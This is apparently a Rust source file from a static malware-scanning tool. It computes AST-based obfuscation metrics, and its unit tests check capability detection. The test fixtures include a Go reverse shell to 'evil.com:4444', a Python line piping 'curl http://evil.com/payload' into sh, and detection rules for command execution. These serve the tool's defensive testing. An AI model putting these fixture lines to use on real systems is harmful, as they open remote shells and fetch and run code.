        let text = text_metrics::analyze_text(content);
        let total_lines = text.total_lines;

        // Single-pass AST walk extracts identifiers, strings, and functions together
        let (identifiers, strings, func_infos) = self.extract_all_from_tree(root, source);

        let ident_refs: Vec<&str> = identifiers
            .iter()
            .map(std::string::String::as_str)
            .collect();
        let identifier_metrics = identifier_metrics::analyze_identifiers(&ident_refs);

        let str_refs: Vec<&str> = strings.iter().map(std::string::String::as_str).collect();
        let string_metrics = string_metrics::analyze_strings(&str_refs);

        let comment_metrics = comment_metrics::analyze_comments(content, self.config.comment_style);

        let func_metrics = function_metrics::analyze_functions(&func_infos, total_lines);

        Metrics {
            text: Some(text),
            identifiers: Some(identifier_metrics),
            strings: Some(string_metrics),
            comments: Some(comment_metrics),
            functions: Some(func_metrics),
            ..Default::default()
        }
    }

    /// Single-pass AST walk that extracts identifiers, string values, and function info
    /// in one traversal instead of three separate walks.
    fn extract_all_from_tree<'a>(
        &self,
        root: &tree_sitter::Node<'a>,
        source: &[u8],
    ) -> (Vec<String>, Vec<String>, Vec<FunctionInfo>) {
        let mut identifiers = Vec::new();
        let mut strings = Vec::new();
        let mut functions = Vec::new();
        let mut func_depth: u32 = 0;
        let mut cursor = root.walk();

        loop {
            let node = cursor.node();
            let kind = node.kind();

            // Identifiers
            if kind == "identifier" || kind == "name" {
                if let Ok(text) = node.utf8_text(source) {
                    if !text.is_empty() {
                        identifiers.push(text.to_string());
                    }
                }
            }

            // Strings
            if self.config.string_node_types.contains(&kind) || kind.contains("string") {
                if let Ok(text) = node.utf8_text(source) {
                    let s = text
                        .trim_start_matches('"')
                        .trim_end_matches('"')
                        .trim_start_matches('\'')
                        .trim_end_matches('\'');
                    if !s.is_empty() {
                        strings.push(s.to_string());
                    }
                }
            }

            // Functions
            if self.config.function_node_types.contains(&kind) {
                let mut info = FunctionInfo::default();
                if let Some(name) = self.extract_function_name(&node, source) {
                    info.name = name;
                }
                info.is_anonymous = info.name.is_empty();
                info.start_line = node.start_position().row as u32;
                info.end_line = node.end_position().row as u32;
                info.line_count = info.end_line.saturating_sub(info.start_line) + 1;
                info.nesting_depth = func_depth;
                functions.push(info);
            }

            if cursor.goto_first_child() {
                if self.config.function_node_types.contains(&kind) {
                    func_depth += 1;
                }
                continue;
            }
            if cursor.goto_next_sibling() {
                continue;
            }
            loop {
                if !cursor.goto_parent() {
                    return (identifiers, strings, functions);
                }
                let parent_kind = cursor.node().kind();
                if self.config.function_node_types.contains(&parent_kind) {
                    func_depth = func_depth.saturating_sub(1);
                }
                if cursor.goto_next_sibling() {
                    break;
                }
            }
        }
    }

    /// Compute ratio and normalized metrics from already-populated AST metrics.
    /// Call this after all base counters are populated (including imports).
    /// All metrics are just division operations - zero parsing overhead.
    fn compute_text_ratio_metrics(metrics: &mut Metrics) {
        // Get references to all metric components
        let text = metrics.text.as_mut();
        let identifiers = metrics.identifiers.as_ref();
        let strings = metrics.strings.as_ref();
        let comments = metrics.comments.as_ref();
        let functions = metrics.functions.as_ref();
        let _statements = metrics.statements.as_ref();
        let imports = metrics.imports.as_ref();

        // Only proceed if we have text metrics (required for ratios)
        let Some(text) = text else { return };

        // Cross-component ratios (per function)
        if let Some(funcs) = functions {
            if funcs.total > 0 {
                if let Some(strs) = strings {
                    text.strings_to_functions_ratio = strs.total as f32 / funcs.total as f32;
                }
                if let Some(idents) = identifiers {
                    text.identifiers_to_functions_ratio =
                        idents.unique_count as f32 / funcs.total as f32;
                }
                if let Some(imps) = imports {
                    text.imports_to_functions_ratio = imps.total as f32 / funcs.total as f32;
                }
            }
        }

        // Per-line density ratios
        if text.total_lines > 0 {
            if let Some(idents) = identifiers {
                text.identifier_density = idents.total as f32 / text.total_lines as f32;
            }
            if let Some(strs) = strings {
                text.string_density = strs.total as f32 / text.total_lines as f32;
            }
            if let Some(imps) = imports {
                text.import_density = (imps.total as f32 * 100.0) / text.total_lines as f32;
            }

            // Size-independent normalized metrics
            let lines_sqrt = (text.total_lines as f32).sqrt();
            if lines_sqrt > 0.0 {
                if let Some(funcs) = functions {
                    text.normalized_function_count = funcs.total as f32 / lines_sqrt;
                }
                if let Some(imps) = imports {
                    text.normalized_import_count = imps.total as f32 / lines_sqrt;
                }
                if let Some(strs) = strings {
                    text.normalized_string_count = strs.total as f32 / lines_sqrt;
                }
            }

            let lines_log = (text.total_lines as f32).log2();
            if lines_log > 0.0 {
                if let Some(idents) = identifiers {
                    text.normalized_unique_identifiers = idents.unique_count as f32 / lines_log;
                }
            }
        }

        // Obfuscation indicator ratios
        if let Some(idents) = identifiers {
            if idents.unique_count > 0 {
                let suspicious = idents.hex_like_names
                    + idents.base64_like_names
                    + idents.sequential_names
                    + idents.keyboard_pattern_names
                    + idents.repeated_char_names;
                text.suspicious_identifier_ratio = suspicious as f32 / idents.unique_count as f32;
            }
        }

        if let Some(strs) = strings {
            if strs.total > 0 {
                let encoded = strs.base64_candidates + strs.hex_strings + strs.url_encoded_strings;
                text.encoded_string_ratio = encoded as f32 / strs.total as f32;

                let suspicious =
                    strs.embedded_code_candidates + strs.shell_command_strings + strs.sql_strings;
                text.suspicious_string_ratio = suspicious as f32 / strs.total as f32;

                let dynamic =
                    strs.concat_operations + strs.char_construction + strs.array_join_construction;
                text.dynamic_string_ratio = dynamic as f32 / strs.total as f32;
            }
        }

        if let Some(cmts) = comments {
            if cmts.total > 0 {
                let suspicious = cmts.high_entropy_comments + cmts.base64_in_comments;
                text.suspicious_comment_ratio = suspicious as f32 / cmts.total as f32;
            }
        }

        if let Some(imps) = imports {
            if imps.total > 0 {
                let dynamic = imps.dynamic_imports + imps.conditional_imports;
                text.dynamic_import_ratio = dynamic as f32 / imps.total as f32;
            }
        }

        if let Some(funcs) = functions {
            if funcs.total > 0 {
                text.anonymous_function_ratio = funcs.anonymous as f32 / funcs.total as f32;
            }
        }
    }
}

impl Analyzer for UnifiedSourceAnalyzer {
    fn analyze_input(&self, input: &AnalysisInput<'_>) -> Result<AnalysisReport> {
        // Handle UTF-16 encoding (same as analyze())
        let bytes: std::borrow::Cow<'_, [u8]> =
            if input.data.len() >= 2 && input.data[0] == 0xFF && input.data[1] == 0xFE {
                // UTF-16 LE BOM
                use encoding_rs::UTF_16LE;
                let (decoded, _, _) = UTF_16LE.decode(&input.data[2..]);
                std::borrow::Cow::Owned(decoded.into_owned().into_bytes())
            } else if input.data.len() >= 2 && input.data[0] == 0xFE && input.data[1] == 0xFF {
                // UTF-16 BE BOM
                use encoding_rs::UTF_16BE;
                let (decoded, _, _) = UTF_16BE.decode(&input.data[2..]);
                std::borrow::Cow::Owned(decoded.into_owned().into_bytes())
            } else {
                std::borrow::Cow::Borrowed(input.data)
            };

        let content = String::from_utf8_lossy(&bytes);

        // Pass pre-extracted stng strings and payloads to avoid redundant extraction.
        // Merge cancellation: prefer struct field (set via builder), fall back to input field
        // (set by the server when it doesn't go through analyzer_for_file_type_arc).
        let effective_cancellation = self.cancellation.as_ref().or(input.cancellation.as_ref());
        Ok(self.analyze_source_impl(
            input.path,
            &content,
            input.data,
            input.strings,
            input.payloads,
            input.sha256.clone(),
            effective_cancellation,
        ))
    }

    fn analyze(&self, file_path: &Path) -> Result<AnalysisReport> {
        // Use smart file reading with automatic UTF-16 normalization
        let data = crate::file_io::read_file_normalized(file_path)?;
        let bytes = data.as_slice();

        let content = String::from_utf8_lossy(bytes);
        Ok(self.analyze_source_with_original(file_path, &content, bytes))
    }

    fn can_analyze(&self, _file_path: &Path) -> bool {
        true
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used)]
mod tests {
    use super::*;
    use crate::analyzers::FileType;
    use std::path::PathBuf;
    use tempfile::NamedTempFile;

    #[test]
    fn test_python_analysis() {
        let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::Python).unwrap();
        let path = PathBuf::from("test.py");
        let code = r#"
import os

def main():
    os.system("echo hello")
    print("world")

if __name__ == "__main__":
    main()
"#;
        let report = analyzer.analyze_source(&path, code);
        assert!(report.structure.iter().any(|s| s.id.contains("python")));
        assert!(!report.functions.is_empty());
        assert!(!report.strings.is_empty());
    }

    #[test]
    fn test_javascript_analysis() {
        let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::JavaScript).unwrap();
        let path = PathBuf::from("test.js");
        let code = r#"
const http = require('http');

function fetchData(url) {
    return http.get(url);
}

const handler = async () => {
    await fetchData("http://example.com");
};
"#;
        let report = analyzer.analyze_source(&path, code);
        assert!(report.structure.iter().any(|s| s.id.contains("javascript")));
        assert!(!report.functions.is_empty());
    }

    #[test]
    fn test_go_analysis() {
        let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::Go).unwrap();
        let path = PathBuf::from("test.go");
        let code = r#"
package main

import "fmt"

func main() {
    fmt.Println("Hello, World!")
}
"#;
        let report = analyzer.analyze_source(&path, code);
        assert!(report.structure.iter().any(|s| s.id.contains("go")));
        assert!(!report.functions.is_empty());
    }

    #[test]
    fn test_all_languages_have_configs() {
        // Ensure all source code file types have configurations
        let types = vec![
            FileType::Python,
            FileType::JavaScript,
            FileType::TypeScript,
            FileType::Go,
            FileType::Rust,
            FileType::Ruby,
            FileType::Php,
            FileType::Shell,
            FileType::Lua,
            FileType::Perl,
            FileType::PowerShell,
            FileType::Java,
            FileType::CSharp,
            FileType::C,
            FileType::Swift,
            FileType::ObjectiveC,
            FileType::Groovy,
            FileType::Scala,
            FileType::Zig,
            FileType::Elixir,
        ];

        for ft in types {
            assert!(
                config_for_file_type(&ft).is_some(),
                "Missing config for {:?}",
                ft
            );
        }
    }

    // Go-specific capability detection tests
    // These verify the unified analyzer correctly detects Go capabilities via the trait system

    fn go_test_mapper() -> crate::capabilities::CapabilityMapper {
        let yaml = r#"
defaults:
  platforms: [linux, macos, windows, unix, android, ios]
  for: [go]
traits:
  - id: micro-behaviors/process/create/direct::exec-command
    desc: Executes commands via Go os/exec
    crit: suspicious
    conf: 0.95
    if:
      type: symbol
      exact: exec.Command

  - id: micro-behaviors/process/create/direct::syscall-exec
    desc: Executes commands via Go syscall.Exec
    crit: suspicious
    conf: 0.95
    if:
      type: symbol
      exact: syscall.Exec

  - id: micro-behaviors/communications/socket/connect::dial
    desc: Go net.Dial call
    crit: baseline
    conf: 0.95
    if:
      type: symbol
      exact: net.Dial

  - id: micro-behaviors/communications/socket/listen::listen-go
    desc: Go net.Listen call
    crit: baseline
    conf: 0.95
    if:
      type: symbol
      exact: net.Listen

  - id: micro-behaviors/communications/http/get::http-get
    desc: Go http.Get call
    crit: baseline
    conf: 0.95
    if:
      type: symbol
      exact: http.Get

  - id: micro-behaviors/communications/http/server::listenandserve-call
    desc: Go http.ListenAndServe call
    crit: baseline
    conf: 0.95
    if:
      type: symbol
      exact: http.ListenAndServe

  - id: micro-behaviors/crypto/library::aes-new-cipher
    desc: Go AES cipher construction
    crit: baseline
    conf: 0.95
    if:
      type: symbol
      exact: aes.NewCipher

  - id: micro-behaviors/crypto/library::rsa-generate-key
    desc: Go RSA key generation
    crit: baseline
    conf: 0.95
    if:
      type: symbol
      exact: rsa.GenerateKey

  - id: micro-behaviors/fs/file/operations::os-create
    desc: Go file creation
    crit: baseline
    conf: 0.95
    if:
      type: symbol
      exact: os.Create
"#;

        let mut file = NamedTempFile::new().expect("create temp yaml");
        std::io::Write::write_all(&mut file, yaml.as_bytes()).expect("write temp yaml");
        crate::capabilities::CapabilityMapper::from_yaml_with_precision_thresholds(
            file.path(),
            crate::capabilities::CapabilityMapper::DEFAULT_MIN_HOSTILE_PRECISION,
            crate::capabilities::CapabilityMapper::DEFAULT_MIN_SUSPICIOUS_PRECISION,
            false,
        )
        .expect("load test-local go mapper")
    }

    fn analyze_go_code(code: &str) -> crate::types::AnalysisReport {
        let mapper = go_test_mapper();
        let analyzer = UnifiedSourceAnalyzer::for_file_type(&FileType::Go)
            .unwrap()
            .with_capability_mapper(mapper);
        let path = PathBuf::from("test.go");
        analyzer.analyze_source(&path, code)
    }

    #[test]
    fn test_detect_exec_command() {
        let code = r#"
package main
import "os/exec"
func main() {
    cmd := exec.Command("ls", "-la")
    cmd.Run()
}
"#;
        let report = analyze_go_code(code);
        assert!(
            report
                .findings
                .iter()
                .any(|c| c.id == "micro-behaviors/process/create/direct::exec-command"),
            "Expected micro-behaviors/process/create/direct::exec-command, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_detect_syscall_exec() {
        let code = r#"
package main
import "syscall"
func main() {
    syscall.Exec("/bin/sh", []string{}, nil)
}
"#;
        let report = analyze_go_code(code);
        assert!(
            report
                .findings
                .iter()
                .any(|c| c.id == "micro-behaviors/process/create/direct::syscall-exec"),
            "Expected micro-behaviors/process/create/direct::syscall-exec, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_detect_reverse_shell() {
        let code = r#"
package main
import ("net"; "os/exec")
func main() {
    conn, _ := net.Dial("tcp", "evil.com:4444")
    cmd := exec.Command("/bin/sh")
    cmd.Stdin = conn
}
"#;
        let report = analyze_go_code(code);
        assert!(
            report
                .findings
                .iter()
                .any(|c| c.id == "micro-behaviors/communications/socket/connect::dial"),
            "Expected micro-behaviors/communications/socket/connect::dial, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
        assert!(
            report
                .findings
                .iter()
                .any(|c| c.id == "micro-behaviors/process/create/direct::exec-command"),
            "Expected micro-behaviors/process/create/direct::exec-command, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_detect_net_listen() {
        let code = r#"
package main
import "net"
func main() {
    ln, _ := net.Listen("tcp", ":8080")
}
"#;
        let report = analyze_go_code(code);
        assert!(
            report
                .findings
                .iter()
                .any(|c| c.id == "micro-behaviors/communications/socket/listen::listen-go"),
            "Expected micro-behaviors/communications/socket/listen::listen-go, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_detect_net_dial() {
        let code = r#"
package main
import "net"
func main() {
    conn, _ := net.Dial("tcp", "example.com:80")
}
"#;
        let report = analyze_go_code(code);
        assert!(
            report
                .findings
                .iter()
                .any(|c| c.id == "micro-behaviors/communications/socket/connect::dial"),
            "Expected micro-behaviors/communications/socket/connect::dial, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_detect_http_get() {
        let code = r#"
package main
import "net/http"
func main() {
    resp, _ := http.Get("https://example.com")
}
"#;
        let report = analyze_go_code(code);
        assert!(
            report
                .findings
                .iter()
                .any(|c| c.id == "micro-behaviors/communications/http/get::http-get"),
            "Expected micro-behaviors/communications/http/get::http-get, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_detect_http_server() {
        let code = r#"
package main
import "net/http"
func main() {
    http.ListenAndServe(":8080", nil)
}
"#;
        let report = analyze_go_code(code);
        // The ListenAndServe call should be detected either as a dedicated trait
        // or as an internal symbol marker
        assert!(
            report.findings.iter().any(|c| c.id
                == "micro-behaviors/communications/http/server::go-http-server"
                || c.id == "micro-behaviors/communications/http/server::listenandserve-call"
                || c.id == "metadata/internal/symbols::http/listenandserve"),
            "Expected go-http-server, listenandserve-call, or http/listenandserve symbol, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_detect_aes_encryption() {
        let code = r#"
package main
import "crypto/aes"
func main() {
    key := []byte("secret")
    block, _ := aes.NewCipher(key)
    _ = block
}
"#;
        let report = analyze_go_code(code);
        assert!(
            report.findings.iter().any(|c| {
                c.id == "micro-behaviors/crypto/library::aes-new-cipher"
                    || c.id == "micro-behaviors/crypto/library/signals::aes-new-cipher"
            }),
            "Expected micro-behaviors/crypto/library::aes-new-cipher or micro-behaviors/crypto/library/signals::aes-new-cipher, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_detect_rsa_encryption() {
        let code = r#"
package main
import "crypto/rsa"
func main() {
    key, _ := rsa.GenerateKey(rand.Reader, 2048)
}
"#;
        let report = analyze_go_code(code);
        assert!(
            report.findings.iter().any(|c| {
                c.id == "micro-behaviors/crypto/library::rsa-generate-key"
                    || c.id == "micro-behaviors/crypto/library/signals::rsa-generate-key"
            }),
            "Expected micro-behaviors/crypto/library::rsa-generate-key or micro-behaviors/crypto/library/signals::rsa-generate-key, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_detect_file_write() {
        let code = r#"
package main
import "os"
func main() {
    f, _ := os.Create("test.txt")
    f.WriteString("data")
}
"#;
        let report = analyze_go_code(code);
        assert!(
            report
                .findings
                .iter()
                .any(|c| c.id == "micro-behaviors/fs/file/operations::os-create"),
            "Expected micro-behaviors/fs/file/operations::os-create, found: {:?}",
            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_go_structural_feature() {
        let code = "package main\nfunc main() {}";
        let report = analyze_go_code(code);
        assert!(report
            .structure
            .iter()
            .any(|s| s.id == "source/language/go"));
    }

    #[test]
    fn test_go_extract_functions() {
        let code = r#"
package main

func hello() string {
    return "world"
}

func main() {
    hello()
}
"#;
        let report = analyze_go_code(code);
        assert!(report.functions.len() >= 2);
        assert!(report.functions.iter().any(|f| f.name == "hello"));
        assert!(report.functions.iter().any(|f| f.name == "main"));
    }

    #[test]
    fn test_go_multiple_capabilities() {
        let code = r#"
package main
import ("os/exec"; "net/http"; "os")

func main() {
    exec.Command("whoami").Run()
    http.Get("https://evil.com")
    os.Remove("/tmp/file")
}
"#;
        let report = analyze_go_code(code);
        assert!(
            report.findings.len() >= 2,
            "Expected >= 2 findings, found: {}",
            report.findings.len()
        );
        assert!(
            report
                .findings
                .iter()
                .any(|c| c.id == "micro-behaviors/process/create/direct::exec-command"),
            "Expected micro-behaviors/process/create/direct::exec-command"
        );
        assert!(
            report
                .findings
                .iter()
                .any(|c| c.id == "micro-behaviors/communications/http/get::http-get"),
            "Expected micro-behaviors/communications/http/get::http-get"
        );
    }

    /// Regression test for rayon deadlock when embedded code detection
    /// triggers recursive `analyze_source_impl` from within a saturated
    /// rayon thread pool. Before the fix, the inner `rayon::in_place_scope`
    /// would wait forever for a free thread that could never appear.
    #[test]
    fn test_embedded_code_no_deadlock_under_rayon_pressure() {
        use rayon::prelude::*;
        use std::sync::mpsc;

        // Python code large enough to trigger embedded code detection
        // (> MIN_PLAIN_SIZE=50 bytes, with multiple language indicators)
        let embedded_python = r#"import os
import sys
def exploit():
    os.system('curl http://evil.com/payload | sh')
    sys.exit(0)
exploit()"#;

        // A shell script that contains the embedded Python as a string
        let shell_script = format!(
            "#!/bin/bash\necho '{}'\ncurl http://example.com\n",
            embedded_python
        );

        // Use a small thread pool to make deadlock more likely
        let pool = rayon::ThreadPoolBuilder::new()
            .num_threads(2)
            .build()
            .unwrap();

        let (tx, rx) = mpsc::channel();

        pool.spawn(move || {
            // Saturate both threads with par_iter, each analyzing a script
            // that may trigger embedded code detection → recursive analysis
            let items: Vec<_> = (0..4).collect();
            items.par_iter().for_each(|i| {
                #[allow(clippy::expect_used)]
                let analyzer =
                    UnifiedSourceAnalyzer::for_file_type(&FileType::Shell).expect("shell analyzer");
                let path = PathBuf::from(format!("test_{}.sh", i));
                let _report = analyzer.analyze_source(&path, &shell_script);
            });
            let _ = tx.send(());
        });

        // If the deadlock is present, this will hang forever.
        // 30 seconds is very generous — normal completion is <1s.
        let result = rx.recv_timeout(std::time::Duration::from_secs(30));
        assert!(
            result.is_ok(),
            "Timed out — likely deadlock in embedded code detection under rayon pressure"
        );
    }
}
